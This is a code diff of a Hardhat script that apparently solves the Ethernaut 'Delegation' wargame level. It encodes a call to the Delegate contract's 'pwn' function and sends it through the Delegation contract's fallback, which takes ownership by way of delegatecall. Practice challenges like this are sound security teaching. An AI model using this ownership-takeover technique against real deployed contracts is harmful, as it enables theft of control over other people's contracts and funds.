@@ -7,10 +7,22 @@ async function main() {
   const deployers = await ethers.getSigners();
   console.log("Deployer address is", deployers[0].address);
 
-  // Send new token to the deployer
-  const Sender = await ethers.getContractFactory("Sender");
-  const sender = await Sender.deploy(ETHERNAUT_ADDRESS, deployers[0].address);
-  console.log("Deploy Sender contract at", sender.address);
+  // Get the Delegate contract
+  const Delegate = await ethers.getContractFactory("Delegate");
+
+  // Get the Ethernaut Delegation contract
+  const Delegation = await ethers.getContractFactory("Delegation");
+  const delegation = await Delegation.attach(ETHERNAUT_ADDRESS);
+  console.log("Attach Delegation contract at", delegation.address);
+
+  // Get the encode function data
+  const encodeFx = Delegate.interface.encodeFunctionData("pwn", []);
+  const data = ethers.utils.hexlify(encodeFx);
+
+  // Change the owner
+  const fallbackTx = await delegation.fallback({ data, gasLimit: 1000000 });
+  await fallbackTx.wait();
+  console.log("Fallback transaction mined at", fallbackTx.hash);
 }
 
 main().catch((error) => {
